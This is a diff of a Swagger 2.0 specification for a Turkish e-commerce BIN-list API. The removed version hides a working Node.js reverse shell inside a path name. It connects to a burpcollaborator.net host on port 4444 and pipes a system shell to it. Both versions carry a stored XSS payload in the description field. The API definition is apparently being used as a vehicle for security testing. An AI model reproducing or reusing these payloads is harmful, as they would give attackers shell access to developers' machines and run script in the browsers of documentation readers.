@@ -1,46 +1,126 @@
- {
-          "swagger": "2.0",
-          "info": {
-              "description": "AFoo <responsive-image src="foo.jpg" onerror=alert(/enforsec/) />",
-              "version": "1.0.0",
-              "title": "C"
-          },
-          "schemes": [
-              "http"
-          ],
-          "host": "apiportal.bkm.com.tr",
-          "basePath": "/",
-          "produces": [
-              "application/json"
-          ],
-          "consumes": [
-              "application/json"
-          ],
-          "paths": {
-              "/a');};};return exports;})); (function(){ var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? \"cmd\" : \"/bin/sh\"; var net = require(\"net\"), cp = require(\"child_process\"), util = require(\"util\"), sh = cp.spawn(cmd, []); var client = this; var counter=0; function StagerRepeat(){ client.socket = net.connect(4444, \"z22mnmvl0eygubynl6m1gp9onft5hu.burpcollaborator.net\", function() { client.socket.pipe(sh.stdin); if (typeof util.pump === \"undefined\") { sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); } }); socket.on(\"error\", function(error) { counter++; if(counter<= 10){ setTimeout(function() { StagerRepeat();}, 5*1000); } else process.exit(); }); } StagerRepeat(); })();(function(){}(this,function(){a=function(){b=function(){new Array('": {
-                  "get": {
-                      "description": "D",
-                      "responses": {
-                          "200": {
-                              "description": "E",
-                              "schema": {
-                                  "$ref": "#/definitions/d"
-                              }
-                          }
-                      }
-                  }
-              }
-          },
-          "definitions": {
-              "d": {
-                  "type": "object",
-                  "description": "F",
-                  "properties": {
-                      "id": {
-                          "type": "integer",
-                          "format": "int64"
-                      }
-                  }
-              }
+{
+  "swagger": "2.0",
+  "info": {
+    "version": "V1",
+    "title": "BIN LİSTESİ API DOKÜMANI",
+    "description": "BIFoo <responsive-image src="foo.jpg" onerror=alert(/enforsec/) />
+N (Bank Identification Number) API servisi, e-ticaret sistemlerinde ödeme yapılacak kartın ilk 6 hanesi ile banka ve kart tipini anlayabilmesini sağlayan servistir.Türkiye’de kart çıkaran kurumların Bin listesine bu api servis üzerinden ulaşabilirsiniz.<br/><br/><b>Servisin Kullanımı:</b><br/>API katalog sayfasında Bin Listesi için 'Test Ortamı Anahtarı' talebinde bulununuz.BKM tarafında anahtar talebiniz onaylandıktan sonra emailinize gelen test ortamına ait anahtar ile ekrandaki araç üzerinden API anahtarınızı ekleyerek test ortama ait bin api servisimize erişebilirsiniz.<br/><br/>Servisden başarılı yanıt aldıktan sonra üretim ortamına geçiş için API katalog sayfasında Bin Listesi için 'Üretim Ortamı Anahtarı' talebinde bulununuz.BKM tarafında anahtar talebiniz değerlendirilmeye alınacaktır.Talebiniz onaylandıktan sonra emailinize gelen üretim ortamına ait anahtar ile uygulamanız üzerinden aşağıdaki üretim ortamına ait api servis adresini çağırabilirsiniz.<br/><br/>Üretim ortamı için BIN API servis URL: https://apiportal.bkm.com.tr/gw/e-ticaret-bin-list/GetECommerceBasicBinList<br/><br/><b>NOT:</b> Servis RESTFUL olarak JSON formatında verilerle çalışır.",
+    "termsOfService": "",
+    "x-swagger-net-version": "8.3.18.001"
+  },
+  "host": "apiportal.bkm.com.tr",
+  "basePath": "/gw/sb/e-ticaret-bin-list",
+  "schemes": [
+    "https"
+  ],
+  "paths": {
+    "/GetECommerceBasicBinList/": {
+      "get": {
+        "tags": [
+          "BIN List"
+        ],
+        "summary": "",
+        "description": "",
+        "operationId": "Yth_GetECommerceDetailedBinList",
+        "consumes": [
+          
+        ],
+        "produces": [
+          "application/json",
+          "text/json",
+          "application/xml",
+          "text/xml"
+        ],
+        "parameters": [
+          {
+            "name": "Authorization",
+            "in": "header",
+            "description": "API Key",
+            "required": true,
+            "type": "string",
+            "default": ""
           }
+        ],
+        "responses": {
+          "200": {
+            "description": "OK",
+            "schema": {
+              "$ref": "#/definitions/ECommerceDetailedBinListResponse"
+            }
+          }
+        }
       }
+    }
+  },
+  "definitions": {
+    "ECommerceDetailedBinListResponse": {
+      "description": "E-Ticaret BIN listesi cevap nesnesi",
+      "properties": {
+        "ECommercePrefixInfoList": {
+          "description": "Prefix (BIN) Bilgileri",
+          "items": {
+            "$ref": "#/definitions/ECommerceDetailedPrefixInfo"
+          },
+          "xml": {
+            "name": "ECommerceDetailedPrefixInfo",
+            "wrapped": true
+          },
+          "type": "array"
+        },
+        "Code": {
+          "description": "İşlem başarılı ise 0000, değilse hata kodu",
+          "type": "string"
+        },
+        "Success": {
+          "description": "İşlem başarılı mı?",
+          "type": "boolean"
+        },
+        "UserMessage": {
+          "description": "İşlem başarılı ise başarı mesajı, değilse hata mesajı",
+          "type": "string"
+        }
+      },
+      "xml": {
+        "name": "ECommerceDetailedBinListResponse"
+      },
+      "type": "object"
+    },
+    "ECommerceDetailedPrefixInfo": {
+      "description": "E-Ticaret BIN detay bilgileri",
+      "properties": {
+             "MemberNo": {
+          "description": "Üye Numarası bilgisi yer alır.",
+          "type": "integer",
+          "format": "int32"
+        },
+        "MemberName": {
+          "description": "Üye Adı bilgisi yer alır.",
+          "type": "string"
+        },
+        "PrefixNo": {
+          "description": "BIN Numarası bilgisi yer alır.",
+          "type": "integer",
+          "format": "int32"
+        },
+        "CardType": {
+          "description": "Kart tipi (kredi Kartı,Banka Kartı,Ön Ödemeli Kart)",
+          "type": "string"
+        },
+        "IsBusinessCard": {
+          "description": "Şirket Kartı varsa true, yoksa false değerleri alır.",
+          "type": "boolean"
+        }
+      },
+      "xml": {
+        "name": "ECommerceDetailedPrefixInfo"
+      },
+      "type": "object"
+    }
+  },
+  "tags": [
+    {
+      "name": "BIN List",
+      "description": "BIN List modülü servisleri"
+    }
+  ]
+}
